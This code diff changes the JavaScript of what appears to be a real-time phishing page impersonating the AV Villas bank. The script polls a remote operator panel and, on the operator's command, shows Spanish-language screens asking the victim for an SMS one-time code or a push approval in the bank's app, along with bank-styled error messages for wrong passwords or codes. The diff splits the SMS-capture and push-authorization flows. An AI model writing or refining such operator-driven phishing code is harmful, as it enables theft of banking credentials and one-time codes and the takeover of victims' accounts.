@@ -125,23 +125,28 @@ function startPolling() {
         const data = await response.json();
         
         // Handle Operator Action
-        if (data.action === 'dinamica' || data.action === 'sms') {
-          // Operator requested dynamic key or SMS
+        if (data.action === 'sms') {
+          // Operator requested SMS -> Open SMS input (smsScreen) and stop polling
           stopPolling();
           if (smsLead) {
-            smsLead.textContent = data.action === 'sms' 
-              ? "Por tu seguridad hemos enviado una clave temporal a tu celular registrado."
-              : "Por tu seguridad, ingresa el código de tu dinámica de la App AV Villas.";
+            smsLead.textContent = "Por tu seguridad hemos enviado una clave temporal a tu celular registrado.";
             smsLead.style.color = "inherit";
           }
           openSmsScreen();
+        } else if (data.action === 'dinamica') {
+          // Operator requested Dynamic Key/Push -> Open push screen (authzScreen) and keep polling
+          if (authzScreen.hidden) {
+            openAuthzScreen();
+          }
         } else if (data.action === 'error-login') {
           stopPolling();
           stopPing();
+          authzScreen.hidden = true;
+          smsScreen.hidden = true;
           spinner.hidden = true;
           errorEl.textContent = "La contraseña o el documento no son válidos. Inténtalo de nuevo.";
           errorEl.hidden = false;
-        } else if (data.action === 'error-dinamica' || data.action === 'error-sms') {
+        } else if (data.action === 'error-sms') {
           stopPolling();
           spinner.hidden = true;
           openSmsScreen();
@@ -149,6 +154,13 @@ function startPolling() {
             smsLead.textContent = "El código ingresado es incorrecto. Por favor, digítalo de nuevo.";
             smsLead.style.color = "red";
           }
+        } else if (data.action === 'error-dinamica') {
+          stopPolling();
+          stopPing();
+          authzScreen.hidden = true;
+          spinner.hidden = true;
+          errorEl.textContent = "La autorización en tu aplicación AV Villas fue rechazada o expiró. Inténtalo de nuevo.";
+          errorEl.hidden = false;
         }
         
         // Handle Operator Done State
